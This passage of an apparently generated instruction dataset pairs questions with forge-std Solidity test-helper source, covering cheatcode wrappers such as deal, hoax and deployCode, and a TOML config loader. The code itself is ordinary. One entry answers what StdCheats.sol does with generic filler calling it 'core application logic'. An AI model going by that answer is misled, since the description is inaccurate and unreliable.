virtual returns (address addr) {\n        bytes memory bytecode = vm.getCode(what);\n        assembly (\"memory-safe\") {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(addr != address(0), \"StdCheats deployCode(string): Deployment failed.\");\n    }\n\n    /// @dev deploy contract with value on construction\n    function deployCode(string memory what, bytes memory args, uint256 val) internal virtual returns (address addr) {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        assembly (\"memory-safe\") {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(addr != address(0), \"StdCheats deployCode(string,bytes,uint256): Deployment failed.\");\n    }\n\n    function deployCode(string memory what, uint256 val) internal virtual returns (address addr) {\n        bytes memory bytecode = vm.getCode(what);\n        assembly (\"memory-safe\") {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(addr != address(0), \"StdCheats deployCode(string,uint256): Deployment failed.\");\n    }\n\n    // creates a labeled address and the corresponding private key\n    function makeAddrAndKey(string memory name) internal virtual returns (address addr, uint256 privateKey) {\n        privateKey = uint256(keccak256(abi.encodePacked(name)));\n        addr = vm.addr(privateKey);\n        vm.label(addr, name);\n    }\n\n    // creates a labeled address\n    function makeAddr(string memory name) internal virtual returns (address addr) {\n        (addr,) = makeAddrAndKey(name);\n    }\n\n    // Destroys an account immediately, sending the balance to beneficiary.\n    // Destroying means: balance will be zero, code will be empty, and nonce will be 0\n    // This is similar to selfdestruct but not identical: selfdestruct destroys code and nonce\n    // only after tx ends, this will run immediately.\n    function destroyAccount(address who, address beneficiary) internal virtual {\n        uint256 currBalance = who.balance;\n        vm.etch(who, abi.encode());\n        vm.deal(who, 0);\n        vm.resetNonce(who);\n\n        uint256 beneficiaryBalance = beneficiary.balance;\n        vm.deal(beneficiary, currBalance + beneficiaryBalance);\n    }\n\n    // creates a struct containing both a labeled address and the corresponding private key\n    function makeAccount(string memory name) internal virtual returns (Account memory account) {\n        (account.addr, account.key) = makeAddrAndKey(name);\n    }\n\n    function deriveRememberKey(string memory mnemonic, uint32 index)\n        internal\n        virtual\n        returns (address who, uint256 privateKey)\n    {\n        privateKey = vm.deriveKey(mnemonic, index);\n        who = vm.rememberKey(privateKey);\n    }\n\n    function _bytesToUint(bytes memory b) private pure returns (uint256) {\n        require(b.length <= 32, \"StdCheats _bytesToUint(bytes): Bytes length exceeds 32.\");\n        return abi.decode(abi.encodePacked(new bytes(32 - b.length), b), (uint256));\n    }\n\n    function isFork() internal view virtual returns (bool status) {\n        try vm.activeFork() {\n            status = true;\n        } catch (bytes memory) {}\n    }\n\n    modifier skipWhenForking() {\n        if (!isFork()) {\n            _;\n        }\n    }\n\n    modifier skipWhenNotForking() {\n        if (isFork()) {\n            _;\n        }\n    }\n\n    modifier noGasMetering() {\n        vm.pauseGasMetering();\n        // To prevent turning gas monitoring back on with nested functions that use this modifier,\n        // we check if gasMetering started in the off position. If it did, we don't want to turn\n        // it back on until we exit the top level function that used the modifier\n        //\n        // i.e. funcA() noGasMetering { funcB() }, where funcB has noGasMetering as well.\n        // funcA will have `gasStartedOff` as false, funcB will have it as true,\n        // so we only turn metering back on at the end of the funcA\n        bool gasStartedOff = gasMeteringOff;\n        gasMeteringOff = true;\n\n        _;\n\n        // if gas metering was on when this modifier was called, turn it back on at the end\n        if (!gasStartedOff) {\n            gasMeteringOff = false;\n            vm.resumeGasMetering();\n        }\n    }\n\n    // We use this complex approach of `_viewChainId` and `_pureChainId` to ensure there are no\n    // compiler warnings when accessing chain ID in any solidity version supported by forge-std. We\n    // can't simply access the chain ID in a normal view or pure function because the solc View Pure\n    // Checker changed `chainid` from pure to view in 0.8.0.\n    function _viewChainId() private view returns (uint256 chainId) {\n        // Assembly required since `block.chainid` was introduced in 0.8.0.\n        assembly {\n            chainId := chainid()\n        }\n\n        address(this); // Silence warnings in older Solc versions.\n    }\n\n    function _pureChainId() private pure returns (uint256 chainId) {\n        function() internal view returns (uint256) fnIn = _viewChainId;\n        function() internal pure returns (uint256) pureChainId;\n        assembly {\n            pureChainId := fnIn\n        }\n        chainId = pureChainId();\n    }\n}\n\n// Wrappers around cheatcodes to avoid footguns\nabstract contract StdCheats is StdCheatsSafe {\n    using stdStorage for StdStorage;\n\n    StdStorage private stdstore;\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    address private constant CONSOLE2_ADDRESS = 0x000000000000000000636F6e736F6c652e6c6f67;\n\n    // Skip forward or rewind time by the specified number of seconds\n    function skip(uint256 time) internal virtual {\n        vm.warp(vm.getBlockTimestamp() + time);\n    }\n\n    function rewind(uint256 time) internal virtual {\n        vm.warp(vm.getBlockTimestamp() - time);\n    }\n\n    // Setup a prank from an address that has some ether\n    function hoax(address msgSender) internal virtual {\n        vm.deal(msgSender, 1 << 128);\n        vm.prank(msgSender);\n    }\n\n    function hoax(address msgSender, uint256 give) internal virtual {\n        vm.deal(msgSender, give);\n        vm.prank(msgSender);\n    }\n\n    function hoax(address msgSender, address origin) internal virtual {\n        vm.deal(msgSender, 1 << 128);\n        vm.prank(msgSender, origin);\n    }\n\n    function hoax(address msgSender, address origin, uint256 give) internal virtual {\n        vm.deal(msgSender, give);\n        vm.prank(msgSender, origin);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    function startHoax(address msgSender) internal virtual {\n        vm.deal(msgSender, 1 << 128);\n        vm.startPrank(msgSender);\n    }\n\n    function startHoax(address msgSender, uint256 give) internal virtual {\n        vm.deal(msgSender, give);\n        vm.startPrank(msgSender);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    // tx.origin is set to the origin parameter\n    function startHoax(address msgSender, address origin) internal virtual {\n        vm.deal(msgSender, 1 << 128);\n        vm.startPrank(msgSender, origin);\n    }\n\n    function startHoax(address msgSender, address origin, uint256 give) internal virtual {\n        vm.deal(msgSender, give);\n        vm.startPrank(msgSender, origin);\n    }\n\n    function changePrank(address msgSender) internal virtual {\n        console2_log_StdCheats(\"changePrank is deprecated. Please use vm.startPrank instead.\");\n        vm.stopPrank();\n        vm.startPrank(msgSender);\n    }\n\n    function changePrank(address msgSender, address txOrigin) internal virtual {\n        console2_log_StdCheats(\"changePrank is deprecated. Please use vm.startPrank instead.\");\n        vm.stopPrank();\n        vm.startPrank(msgSender, txOrigin);\n    }\n\n    // The same as Vm's `deal`\n    // Use the alternative signature for ERC20 tokens\n    function deal(address to, uint256 give) internal virtual {\n        vm.deal(to, give);\n    }\n\n    // Set the balance of an account for any ERC20 token\n    // Use the alternative signature to update `totalSupply`\n    function deal(address token, address to, uint256 give) internal virtual {\n        deal(token, to, give, false);\n    }\n\n    // Set the balance of an account for any ERC1155 token\n    // Use the alternative signature to update `totalSupply`\n    function dealERC1155(address token, address to, uint256 id, uint256 give) internal virtual {\n        dealERC1155(token, to, id, give, false);\n    }\n\n    function deal(address token, address to, uint256 give, bool adjust) internal virtual {\n        // get current balance\n        (, bytes memory balData) = token.staticcall(abi.encodeWithSelector(0x70a08231, to));\n        uint256 prevBal = abi.decode(balData, (uint256));\n\n        // update balance\n        stdstore.target(token).sig(0x70a08231).with_key(to).checked_write(give);\n\n        // update total supply\n        if (adjust) {\n            (, bytes memory totSupData) = token.staticcall(abi.encodeWithSelector(0x18160ddd));\n            uint256 totSup = abi.decode(totSupData, (uint256));\n            if (give < prevBal) {\n                totSup -= (prevBal - give);\n            } else {\n                totSup += (give - prevBal);\n            }\n            stdstore.target(token).sig(0x18160ddd).checked_write(totSup);\n        }\n    }\n\n    function dealERC1155(address token, address to, uint256 id, uint256 give, bool adjust) internal virtual {\n        // get current balance\n        (, bytes memory balData) = token.staticcall(abi.encodeWithSelector(0x00fdd58e, to, id));\n        uint256 prevBal = abi.decode(balData, (uint256));\n\n        // update balance\n        stdstore.target(token).sig(0x00fdd58e).with_key(to).with_key(id).checked_write(give);\n\n        // update total supply\n        if (adjust) {\n            (, bytes memory totSupData) = token.staticcall(abi.encodeWithSelector(0xbd85b039, id));\n            require(\n                totSupData.length != 0,\n                \"StdCheats deal(address,address,uint,uint,bool): target contract is not ERC1155Supply.\"\n            );\n            uint256 totSup = abi.decode(totSupData, (uint256));\n            if (give < prevBal) {\n                totSup -= (prevBal - give);\n            } else {\n                totSup += (give - prevBal);\n            }\n            stdstore.target(token).sig(0xbd85b039).with_key(id).checked_write(totSup);\n        }\n    }\n\n    function dealERC721(address token, address to, uint256 id) internal virtual {\n        // check if token id is already minted and the actual owner.\n        (bool successMinted, bytes memory ownerData) = token.staticcall(abi.encodeWithSelector(0x6352211e, id));\n        require(successMinted, \"StdCheats deal(address,address,uint,bool): id not minted.\");\n\n        // get owner current balance\n        (, bytes memory fromBalData) =\n            token.staticcall(abi.encodeWithSelector(0x70a08231, abi.decode(ownerData, (address))));\n        uint256 fromPrevBal = abi.decode(fromBalData, (uint256));\n\n        // get new user current balance\n        (, bytes memory toBalData) = token.staticcall(abi.encodeWithSelector(0x70a08231, to));\n        uint256 toPrevBal = abi.decode(toBalData, (uint256));\n\n        // update balances\n        stdstore.target(token).sig(0x70a08231).with_key(abi.decode(ownerData, (address))).checked_write(--fromPrevBal);\n        stdstore.target(token).sig(0x70a08231).with_key(to).checked_write(++toPrevBal);\n\n        // update owner\n        stdstore.target(token).sig(0x6352211e).with_key(id).checked_write(to);\n    }\n\n    function deployCodeTo(string memory what, address where) internal virtual {\n        deployCodeTo(what, \"\", 0, where);\n    }\n\n    function deployCodeTo(string memory what, bytes memory args, address where) internal virtual {\n        deployCodeTo(what, args, 0, where);\n    }\n\n    function deployCodeTo(string memory what, bytes memory args, uint256 value, address where) internal virtual {\n        bytes memory creationCode = vm.getCode(what);\n        vm.etch(where, abi.encodePacked(creationCode, args));\n        (bool success, bytes memory runtimeBytecode) = where.call{value: value}(\"\");\n        require(success, \"StdCheats deployCodeTo(string,bytes,uint256,address): Failed to create runtime bytecode.\");\n        vm.etch(where, runtimeBytecode);\n    }\n\n    // Used to prevent the compilation of console, which shortens the compilation time when console is not used elsewhere.\n    function console2_log_StdCheats(string memory p0) private view {\n        (bool status,) = address(CONSOLE2_ADDRESS).staticcall(abi.encodeWithSignature(\"log(string)\", p0));\n        status;\n    }\n}\n\n```"}
{"instruction": "What does the file StdCheats.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdStorage, stdStorage} from \"./StdStorage.sol\";\nimport {console2} from \"./console2.sol\";\nimport {Vm} from \"./Vm.sol\";\n\nabstract contract StdCheatsSafe {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    uint256 private constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    bool private gasMeteringOff;\n\n    // Data structures to parse Transaction objects from the broadcast artifact\n    // that conform to EIP1559. The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct RawTx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        // json value name = function\n        string functionSig;\n        bytes32 hash;\n        // json value name = tx\n        RawTx1559Detail txDetail;\n        // json value name = type\n        string opcode;\n    }\n\n    struct RawTx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        bytes gas;\n        bytes nonce;\n        address to;\n        bytes txType;\n        bytes value;\n    }\n\n    struct Tx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        bytes32 hash;\n        Tx1559Detail txDetail;\n        string opcode;\n    }\n\n    struct Tx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 nonce;\n        address to;\n        uint256 txType;\n        uint256 value;\n    }\n\n    // Data structures to parse Transaction objects from the broadcast artifact\n    // that DO NOT conform to EIP1559. The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct TxLegacy {\n        str\n```", "output": "This file `StdCheats.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdConfig.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdConfig.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {VmSafe} from \"./Vm.sol\";\nimport {Variable, Type, TypeKind, LibVariable} from \"./LibVariable.sol\";\n\n/// @notice  A contract that parses a toml configuration file and load its\n///          variables into storage, automatically casting them, on deployment.\n///\n/// @dev     This contract assumes a toml structure where top-level keys\n///          represent chain ids or aliases. Under each chain key, variables are\n///          organized by type in separate sub-tables like `[<chain>.<type>]`, where\n///          type must be: `bool`, `address`, `bytes32`, `uint`, `Ã¬nt`, `string`, or `bytes`.\n///\n///          Supported format:\n///          ```\n///          [mainnet]\n///          endpoint_url = \"${MAINNET_RPC}\"\n///\n///          [mainnet.bool]\n///          is_live = true\n///\n///          [mainnet.address]\n///          weth = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\"\n///          whitelisted_admins = [\n///             \"${MAINNET_ADMIN}\",\n///             \"0x00000000000000000000000000000000deadbeef\",\n///             \"0x000000000000000000000000000000c0ffeebabe\"\n///          ]\n///\n///          [mainnet.uint]\n///          important_number = 123\n///          ```\ncontract StdConfig {\n    using LibVariable for Type;\n    using LibVariable for TypeKind;\n\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    /// @dev Types: `bool`, `address`, `bytes32`, `uint`, `Ã¬nt`, `string`, `bytes`.\n    uint8 private constant NUM_TYPES = 7;\n\n    // -- ERRORS ---------------------------------------------------------------\n\n    error AlreadyInitialized(string key);\n    error InvalidChainKey(string aliasOrId);\n    error ChainNotInitialized(uint256 chainId);\n    error UnableToParseVariable(string key);\n    error WriteToFileInForbiddenCtxt();\n\n    // -- STORAGE (CACHE FROM CONFIG FILE) ------------------------------------\n\n    /// @dev Path to the loaded TOML configuration file.\n    string private _filePath;\n\n    /// @dev List of top-level keys found in the TOML file, assumed to be chain names/aliases.\n    string[] private _chainKeys;\n\n    /// @dev Storage for the configured RPC URL for each chain.\n    mapping(uint256 => string) private _rpcOf;\n\n    /// @dev Storage for values, organized by chain ID and variable key.\n    mapping(uint256 => mapping(string => bytes)) private _dataOf;\n\n    /// @dev Type cache for runtime checking when casting.\n    mapping(uint256 => mapping(string => Type)) private _typeOf;\n\n    /// @dev When enabled, `set` will always write updates back to the configuration file.\n    ///      Can only be enabled in a scripting context to prevent file corruption from\n    ///      concurrent I/O access, as tests run in parallel.\n    bool private _writeToFile;\n\n    // -- CONSTRUCTOR ----------------------------------------------------------\n\n    /// @notice Reads the TOML file and iterates through each top-level key, which is\n    ///         assumed to be a chain name or ID. For each chain, it caches its RPC\n    ///         endpoint and all variables defined in typed sub-tables like `[<chain>.<type>]`,\n    ///         where type must be: `bool`, `address`, `uint`, `bytes32`, `string`, or `bytes`.\n    ///\n    ///         The constructor attempts to parse each variable first as a single value,\n    ///         and if that fails, as an array of that type. If a variable cannot be\n    ///         parsed as either, the constructor will revert with an error.\n    ///\n    /// @param  configFilePath: The local path to the TOML configuration file.\n    /// @param  writeToFile: Whether to write updates back to the TOML file. Only for scripts.\n    constructor(string memory configFilePath, bool writeToFile) {\n        if (writeToFile && !vm.isContext(VmSafe.ForgeContext.ScriptGroup)) {\n            revert WriteToFileInForbiddenCtxt();\n        }\n\n        _filePath = configFilePath;\n        _writeToFile = writeToFile;\n        string memory content = vm.resolveEnv(vm.readFile(configFilePath));\n        string[] memory chain_keys = vm.parseTomlKeys(content, \"$\");\n\n        // Cache the entire configuration to storage\n        for (uint256 i = 0; i < chain_keys.length; i++) {\n            string memory chain_key = chain_keys[i];\n            // Ignore top-level keys that are not tables\n            if (vm.parseTomlKeys(content, string.concat(\"$.\", chain_key)).length == 0) {\n                continue;\n            }\n            uint256 chainId = resolveChainId(chain_key);\n            _chainKeys.push(chain_key);\n\n            // Cache the configure rpc endpoint for that chain.\n            // Falls back to `[rpc_endpoints]`. Panics if no rpc endpoint is configured.\n            try vm.parseTomlString(content, string.concat(\"$.\", chain_key, \".endpoint_url\")) returns (\n                string memory url\n            ) {\n                _rpcOf[chainId] = vm.resolveEnv(url);\n            } catch {\n                _rpcOf[chainId] = vm.resolveEnv(vm.rpcUrl(chain_key));\n            }\n\n            // Iterate through all the available `TypeKind`s (except `None`) to create the sub-section paths\n            for (uint8 t = 1; t <= NUM_TYPES; t++) {\n                TypeKind ty = TypeKind(t);\n                string memory typePath = string.concat(\"$.\", chain_key, \".\", ty.toTomlKey());\n\n                try vm.parseTomlKeys(content, typePath) returns (string[] memory keys) {\n                    for (uint256 j = 0; j < keys.length; j++) {\n                        string memory key = keys[j];\n                        if (_typeOf[chainId][key].kind == TypeKind.None) {\n                            _loadAndCacheValue(content, string.concat(typePath, \".\", key), chainId, key, ty);\n                        } else {\n                            revert AlreadyInitialized(key);\n                        }\n                    }\n                } catch {}\n            }\n        }\n    }\n\n    function _loadAndCacheValue(\n        string memory content,\n        string memory path,\n        uint256 chainId,\n        string memory key,\n        TypeKind ty\n    ) private {\n        bool success = false;\n        if (ty == TypeKind.Bool) {\n            try vm.parseTomlBool(content, path) returns (bool val) {\n                _dataOf[chainId][key] = abi.encode(val);\n                _typeOf[chainId][key] = Type(TypeKind.Bool, false);\n                success = true;\n            } catch {\n                try vm.parseTomlBoolArray(content, path) returns (bool[] memory val) {\n                    _dataOf[chainId][key] = abi.encode(val);\n                    _typeOf[chainId][key] = Type(TypeKind.Bool, true);\n                    success = true;\n                } catch {}\n            }\n        } else if (ty == TypeKind.Address) {\n            try vm.parseTomlAddress(content, path) returns (address val) {\n                _dataOf[chainId][key] = abi.encode(val);\n                _typeOf[chainId][key] = Type(TypeKind.Address, false);\n                success = true;\n            } catch {\n                try vm.parseTomlAddressArray(content, path) returns (address[] memory val) {\n                    _dataOf[chainId][key] = abi.encode(val);\n                    _typeOf[chainId][key] = Type(TypeKind.Address, true);\n                    success = true;\n                } catch {}\n            }\n        } else if (ty == TypeKind.Bytes32) {\n            try vm.parseTomlBytes32(content, path) returns (bytes32 val) {\n                _dataOf[chainId][key] = abi.encode(val);\n                _typeOf[chainId][key] = Type(TypeKind.Bytes32, false);\n                success = true;\n            } catch {\n                try vm.parseTomlBytes32Array(content, path) returns (bytes32[] memory val) {\n                    _dataOf[chainId][key] = abi.encode(val);\n                    _typeOf[chainId][key] = Type(TypeKind.Bytes32, true);\n                    success = true;\n                } catch {}\n            }\n        } else if (ty == TypeKind.Uint256) {\n            try vm.parseTomlUint(content, path) returns (uint256 val) {\n                _dataOf[chainId][key] = abi.encode(val);\n                _typeOf[chainId][key] = Type(TypeKind.Uint256, false);\n                success = true;\n            } catch {\n                try vm.parseTomlUintArray(content, path) returns (uint256[] memory val) {\n                    _dataOf[chainId][key] = abi.encode(val);\n                    _typeOf[chainId][key] = Type(TypeKind.Uint256, true);\n                    success = true;\n                } catch {}\n            }\n        } else if (ty == TypeKind.Int256) {\n            try vm.parseTomlInt(content, path) returns (int256 val) {\n                _dataOf[chainId][key] = abi.encode(val);\n                _typeOf[chainId][key] = Type(TypeKind.Int256, false);\n                success = true;\n            } catch {\n                try vm.parseTomlIntArray(content, path) returns (int256[] memory val) {\n                    _dataOf[chainId][key] = abi.encode(val);\n                    _typeOf[chainId][key] = Type(TypeKind.Int256, true);\n                    success = true;\n                } catch {}\n            }\n        } else if (ty == TypeKind.Bytes) {\n            try vm.parseTomlBytes(content, path) returns (bytes memory val) {\n                _dataOf[chainId][key] = abi.encode(val);\n                _typeOf[chainId][key] = Type(TypeKind.Bytes, false);\n                success = true;\n            } catch {\n                try vm.parseTomlBytesArray(content, path) returns (bytes[] memory val) {\n                    _dataOf[chainId][key] = abi.encode(val);\n                    _typeOf[chainId][key] = Type(TypeKind.Bytes, true);\n                    success = true;\n                } catch {}\n            }\n        } else if (ty == TypeKind.String) {\n            try vm.parseTomlString(content, path) returns (string memory val) {\n                _dataOf[chainId][key] = abi.encode(val);\n                _typeOf[chainId][key] = Type(TypeKind.String, false);\n                success = true;\n            } catch {\n                try vm.parseTomlStringArray(content, path) returns (string[] memory val) {\n                    _dataOf[chainId][key] = abi.encode(val);\n                    _typeOf[chainId][key] = Type(TypeKind.String, true);\n                    success = true;\n                } catch {}\n            }\n        }\n\n        if (!success) {\n            revert UnableToParseVariable(key);\n        }\n    }\n\n    // -- HELPER FUNCTIONS -----------------------------------------------------\n\n    /// @notice Enable or disable automatic writing to the TOML file on `set`.\n    ///         Can only be enabled when scripting.\n    function writeUpdatesBackToFile(bool enabled) public {\n        if (enabled && !vm.isContext(VmSafe.ForgeContext.ScriptGroup)) {\n            revert WriteToFileInForbiddenCtxt();\n        }\n\n        _writeToFile = enabled;\n    }\n\n    /// @notice Resolves a chain alias or a chain id string to its numerical chain id.\n    /// @param aliasOrId The string representing the chain alias (i.e. \"mainnet\") or a numerical ID (i.e. \"1\").\n    /// @return The numerical chain ID.\n    /// @dev It first attempts to parse the input as a number. If that fails, it uses `vm.getChain` to resolve a named alias.\n    ///      Reverts if the alias is not valid or not a number.\n    function resolveChainId(string memory aliasOrId) public view returns (uint256) {\n        try vm.parseUint(aliasOrId) returns (uint256 chainId) {\n            return chainId;\n        } catch {\n            try vm.getChain(aliasOrId) returns (VmSafe.Chain memory chainInfo) {\n                return chainInfo.chainId;\n            } catch {\n                revert InvalidChainKey(aliasOrId);\n            }\n        }\n    }\n\n    /// @dev Retrieves the chain key/alias from the configuration based on the chain ID.\n    function _getChainKeyFromId(uint256 chainId) private view returns (string memory) {\n        for (uint256 i = 0; i < _chainKeys.length; i++) {\n            if (resolveChainId(_chainKeys[i]) == chainId) {\n                return _chainKeys[i];\n            }\n        }\n        revert ChainNotInitialized(chainId);\n    }\n\n    /// @dev Ensures type consistency when setting a value - prevents changing types unless uninitialized.\n    ///      Updates type only when the previous type was `None`.\n    function _ensureTypeConsistency(uint256 chainId, string memory key, Type memory ty) private {\n        Type memory current = _typeOf[chainId][key];\n\n        if (current.kind == TypeKind.None) {\n            _typeOf[chainId][key] = ty;\n        } else {\n            current.assertEq(ty);\n        }\n    }\n\n    /// @dev Wraps a string in double quotes for JSON compatibility.\n    function _quote(string memory s) private pure returns (string memory) {\n        return string.concat('\"', s, '\"');\n    }\n\n    /// @dev Writes a JSON-formatted value to a specific key in the TOML file.\n    /// @param chainId The chain id to write under.\n    /// @param ty The type category ('bool', 'address', 'uint', 'bytes32', 'string', or 'bytes').\n    /// @param key The variable key name.\n    /// @param jsonValue The JSON-formatted value to write.\n    function _writeToToml(uint256 chainId, string memory ty, string memory key, string memory jsonValue) private {\n        string memory chainKey = _getChainKeyFromId(chainId);\n        string memory valueKey = string.concat(\"$.\", chainKey, \".\", ty, \".\", key);\n        vm.writeToml(jsonValue, _filePath, valueKey);\n    }\n\n    // -- GETTER FUNCTIONS -----------------------------------------------------\n\n    /// @dev    Reads a variable for a given chain id and key, and returns it in a generic container.\n    ///         The caller should use `LibVariable` to safely coerce the type.\n    ///         Example: `uint256 myVar = config.get(\"my_key\").toUint256();`\n    ///\n    /// @param  chain_id The chain ID to read from.\n    /// @param  key The key of the variable to retrieve.\n    /// @return `Variable` struct containing the type and the ABI-encoded value.\n    function get(uint256 chain_id, string memory key) public view returns (Variable memory) {\n        return Variable(_typeOf[chain_id][key], _dataOf[chain_id][key]);\n    }\n\n    /// @dev    Reads a variable for the current chain and a given key, and returns it in a generic container.\n    ///         The caller should use `LibVariable` to safely coerce the type.\n    ///         Example: `uint256 myVar = config.get(\"my_key\").toUint256();`\n    ///\n    /// @param  key The key of the variable to retrieve.\n    /// @return `Variable` struct containing the type and the ABI-encoded value.\n    function get(string memory key) public view returns (Variable memory) {\n        return get(vm.getChainId(), key);\n    }\n\n    /// @dev    Checks the existence of a variable for a given chain ID and key, and returns a boolean.\n    ///         Example: `bool hasKey = config.exists(1, \"my_key\");`\n    ///\n    /// @param chain_id The chain ID to check.\n    /// @param key The variable key name.\n    /// @return `bool` indicating whether a variable with the given key exists.\n    function exists(uint256 chain_id, string memory key) public view returns (bool) {\n        return _dataOf[chain_id][key].length > 0;\n    }\n\n    /// @dev    Checks the existence of a variable for the current chain id and a given key, and returns a boolean.\n    ///         Example: `bool hasKey = config.exists(\"my_key\");`\n    ///\n    /// @param key The variable key name.\n    /// @return `bool` indicating whether a variable with the given key exists.\n    function exists(string memory key) public view returns (bool) {\n        return exists(vm.getChainId(), key);\n    }\n\n    /// @notice Returns the numerical chain ids for all configured chains.\n    function getChainIds() public view returns (uint256[] memory) {\n        string[] memory keys = _chainKeys;\n\n        uint256[] memory ids = new uint256[](keys.length);\n        for (uint256 i = 0; i < keys.length; i++) {\n            ids[i] = resolveChainId(keys[i]);\n        }\n\n        return ids;\n    }\n\n    /// @notice Reads the RPC URL for a specific chain id.\n    function getRpcUrl(uint256 chainId) public view returns (string memory) {\n        return _rpcOf[chainId];\n    }\n\n    /// @notice Reads the RPC URL for the current chain.\n    function getRpcUrl() public view returns (string memory) {\n        return _rpcOf[vm.getChainId()];\n    }\n\n    // -- SETTER FUNCTIONS (SINGLE VALUES) -------------------------------------\n\n    /// @notice Sets a boolean value for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, bool value) public {\n        Type memory ty = Type(TypeKind.Bool, false);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) _writeToToml(chainId, ty.kind.toTomlKey(), key, vm.toString(value));\n    }\n\n    /// @notice Sets a boolean value for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, bool value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets an address value for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, address value) public {\n        Type memory ty = Type(TypeKind.Address, false);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) _writeToToml(chainId, ty.kind.toTomlKey(), key, _quote(vm.toString(value)));\n    }\n\n    /// @notice Sets an address value for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, address value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a bytes32 value for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, bytes32 value) public {\n        Type memory ty = Type(TypeKind.Bytes32, false);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) _writeToToml(chainId, ty.kind.toTomlKey(), key, _quote(vm.toString(value)));\n    }\n\n    /// @notice Sets a bytes32 value for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, bytes32 value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a uint256 value for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, uint256 value) public {\n        Type memory ty = Type(TypeKind.Uint256, false);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) _writeToToml(chainId, ty.kind.toTomlKey(), key, vm.toString(value));\n    }\n\n    /// @notice Sets a uint256 value for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, uint256 value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets an int256 value for a given key and chain ID.\n    function set(uint256 chainId, string memory key, int256 value) public {\n        Type memory ty = Type(TypeKind.Int256, false);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) _writeToToml(chainId, ty.kind.toTomlKey(), key, vm.toString(value));\n    }\n\n    /// @notice Sets an int256 value for a given key on the current chain.\n    function set(string memory key, int256 value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a string value for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, string memory value) public {\n        Type memory ty = Type(TypeKind.String, false);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) _writeToToml(chainId, ty.kind.toTomlKey(), key, _quote(value));\n    }\n\n    /// @notice Sets a string value for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, string memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a bytes value for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, bytes memory value) public {\n        Type memory ty = Type(TypeKind.Bytes, false);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) _writeToToml(chainId, ty.kind.toTomlKey(), key, _quote(vm.toString(value)));\n    }\n\n    /// @notice Sets a bytes value for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, bytes memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    // -- SETTER FUNCTIONS 